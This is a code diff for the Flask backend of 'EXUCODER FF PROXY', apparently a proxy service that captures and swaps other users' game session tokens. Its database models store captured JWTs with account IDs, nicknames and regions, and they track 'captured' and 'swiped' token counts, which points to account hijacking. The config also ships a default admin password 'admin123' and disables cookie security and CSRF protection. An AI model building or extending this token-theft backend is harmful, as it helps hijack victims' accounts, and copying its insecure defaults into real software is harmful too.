@@ -16,29 +16,163 @@ from flask import Flask, request, jsonify, send_from_directory
 from flask_cors import CORS
 from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity, set_access_cookies, unset_jwt_cookies
 from flask_sqlalchemy import SQLAlchemy
+import bcrypt
+from dotenv import load_dotenv
 
-# Import config
-from config import get_config
+# Load environment variables
+load_dotenv()
 
-# Create Flask app
+# =============================================================================
+# CONFIGURATION
+# =============================================================================
+
+class Config:
+    SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
+    JWT_SECRET_KEY = os.environ.get('JWT_SECRET_KEY', secrets.token_hex(32))
+    JWT_ACCESS_TOKEN_EXPIRES = timedelta(hours=24)
+    JWT_TOKEN_LOCATION = ['headers', 'cookies']
+    JWT_COOKIE_SECURE = False
+    JWT_COOKIE_CSRF_PROTECT = False
+    JWT_ACCESS_COOKIE_PATH = '/'
+    
+    SQLALCHEMY_DATABASE_URI = os.environ.get('DATABASE_URL', 'sqlite:///exucoder.db')
+    SQLALCHEMY_TRACK_MODIFICATIONS = False
+    
+    CORS_ORIGINS = os.environ.get('CORS_ORIGINS', 'http://localhost:5000,http://127.0.0.1:5000').split(',')
+    
+    ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
+    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')
+
+# =============================================================================
+# DATABASE MODELS
+# =============================================================================
+
+db = SQLAlchemy()
+
+def generate_api_key():
+    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    return 'exu_' + ''.join(secrets.choice(alphabet) for _ in range(32))
+
+class User(db.Model):
+    __tablename__ = 'users'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(80), unique=True, nullable=False)
+    email = db.Column(db.String(120), unique=True, nullable=False)
+    password_hash = db.Column(db.String(200), nullable=False)
+    api_key = db.Column(db.String(100), unique=True, nullable=False, default=generate_api_key)
+    role = db.Column(db.String(20), default='user')
+    is_active = db.Column(db.Boolean, default=True)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+    last_login = db.Column(db.DateTime)
+    jwts_captured = db.Column(db.Integer, default=0)
+    jwts_swiped = db.Column(db.Integer, default=0)
+    swipe_jwt = db.Column(db.Text, nullable=True)
+    
+    captured_jwts = db.relationship('CapturedJWT', backref='user', lazy=True, cascade='all, delete-orphan')
+    proxy_logs = db.relationship('ProxyLog', backref='user', lazy=True, cascade='all, delete-orphan')
+    
+    def set_password(self, password):
+        self.password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
+    
+    def check_password(self, password):
+        return bcrypt.checkpw(password.encode('utf-8'), self.password_hash.encode('utf-8'))
+    
+    def to_dict(self, include_sensitive=False):
+        data = {
+            'id': self.id,
+            'username': self.username,
+            'email': self.email,
+            'role': self.role,
+            'is_active': self.is_active,
+            'created_at': self.created_at.isoformat() if self.created_at else None,
+            'last_login': self.last_login.isoformat() if self.last_login else None,
+            'jwts_captured': self.jwts_captured,
+            'jwts_swiped': self.jwts_swiped,
+            'has_swipe_jwt': bool(self.swipe_jwt)
+        }
+        if include_sensitive:
+            data['api_key'] = self.api_key
+        return data
+
+class CapturedJWT(db.Model):
+    __tablename__ = 'captured_jwts'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
+    jwt_token = db.Column(db.Text, nullable=False)
+    source = db.Column(db.String(50))
+    account_id = db.Column(db.String(100))
+    nickname = db.Column(db.String(100))
+    region = db.Column(db.String(20))
+    country = db.Column(db.String(20))
+    expiry = db.Column(db.DateTime)
+    captured_at = db.Column(db.DateTime, default=datetime.utcnow)
+    was_swiped = db.Column(db.Boolean, default=False)
+    original_token = db.Column(db.Text, nullable=True)
+    
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'jwt_token': self.jwt_token[:50] + '...' if self.jwt_token else None,
+            'full_jwt': self.jwt_token,
+            'source': self.source,
+            'account_id': self.account_id,
+            'nickname': self.nickname,
+            'region': self.region,
+            'country': self.country,
+            'expiry': self.expiry.isoformat() if self.expiry else None,
+            'captured_at': self.captured_at.isoformat() if self.captured_at else None,
+            'was_swiped': self.was_swiped
+        }
+
+class ProxyLog(db.Model):
+    __tablename__ = 'proxy_logs'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
+    method = db.Column(db.String(10))
+    url = db.Column(db.Text)
+    action = db.Column(db.String(50))
+    ip_address = db.Column(db.String(50))
+    details = db.Column(db.Text)
+
+# =============================================================================
+# CREATE APP
+# =============================================================================
+
 app = Flask(__name__, 
             static_folder='../frontend',
             template_folder='../frontend')
 
 # Load configuration
-app.config.from_object(get_config())
+app.config.from_object(Config)
 
 # Initialize extensions
 cors_origins = app.config.get('CORS_ORIGINS', ['http://localhost:5000'])
 CORS(app, supports_credentials=True, origins=cors_origins)
 jwt = JWTManager(app)
-
-# Import models and initialize database
-from models import db, User, CapturedJWT, ProxyLog, SystemLog, generate_api_key, init_db
 db.init_app(app)
 
-# Initialize database
-init_db(app)
+# =============================================================================
+# INITIALIZE DATABASE
+# =============================================================================
+
+with app.app_context():
+    db.create_all()
+    
+    admin = User.query.filter_by(username=Config.ADMIN_USERNAME).first()
+    if not admin:
+        admin = User(
+            username=Config.ADMIN_USERNAME,
+            email='admin@exucoder.com',
+            role='admin'
+        )
+        admin.set_password(Config.ADMIN_PASSWORD)
+        db.session.add(admin)
+        db.session.commit()
+        print(f"[+] Created admin user from .env")
 
 # =============================================================================
 # AUTHENTICATION DECORATORS
@@ -607,35 +741,42 @@ def admin_clear_data():
     return jsonify({'message': 'All data cleared successfully'}), 200
 
 # =============================================================================
-# ROUTES - STATIC FILES
+# ROUTES - STATIC FILES (FIXED - No duplicate route names)
 # =============================================================================
 
 @app.route('/')
-def index():
+def index_page():
+    """Serve login page at root"""
     return send_from_directory('../frontend', 'login.html')
 
-@app.route('/login')
-def login():
+@app.route('/login-page')
+def login_page():
+    """Serve login page"""
     return send_from_directory('../frontend', 'login.html')
 
-@app.route('/dashboard')
-def dashboard():
+@app.route('/dashboard-page')
+def dashboard_page():
+    """Serve dashboard page"""
     return send_from_directory('../frontend', 'dashboard.html')
 
-@app.route('/settings')
-def settings():
+@app.route('/settings-page')
+def settings_page():
+    """Serve settings page"""
     return send_from_directory('../frontend', 'settings.html')
 
-@app.route('/admin')
-def admin_panel():
+@app.route('/admin-page')
+def admin_page():
+    """Serve admin panel"""
     return send_from_directory('../frontend', 'admin.html')
 
-@app.route('/help')
+@app.route('/help-page')
 def help_page():
+    """Serve help page"""
     return send_from_directory('../frontend', 'help.html')
 
 @app.route('/<path:path>')
 def serve_static(path):
+    """Serve static files"""
     return send_from_directory('../frontend', path)
 
 # =============================================================================
@@ -647,11 +788,11 @@ if __name__ == '__main__':
 ╔═══════════════════════════════════════════════════════════════╗
 ║  🚀 EXUCODER FF PROXY BACKEND STARTED                        ║
 ║  📍 http://localhost:5000                                    ║
-║  📍 http://localhost:5000/login     (Login)                 ║
-║  📍 http://localhost:5000/dashboard  (Dashboard)            ║
-║  📍 http://localhost:5000/admin      (Admin Panel)          ║
-║  📍 http://localhost:5000/settings   (Settings)             ║
-║  📍 http://localhost:5000/help       (Help)                 ║
+║  📍 http://localhost:5000/login-page  (Login)               ║
+║  📍 http://localhost:5000/dashboard-page (Dashboard)        ║
+║  📍 http://localhost:5000/admin-page (Admin Panel)          ║
+║  📍 http://localhost:5000/settings-page (Settings)          ║
+║  📍 http://localhost:5000/help-page (Help)                  ║
 ║                                                             ║
 ║  📦 SQLite Database: exucoder.db                            ║
 ╚═══════════════════════════════════════════════════════════════╝
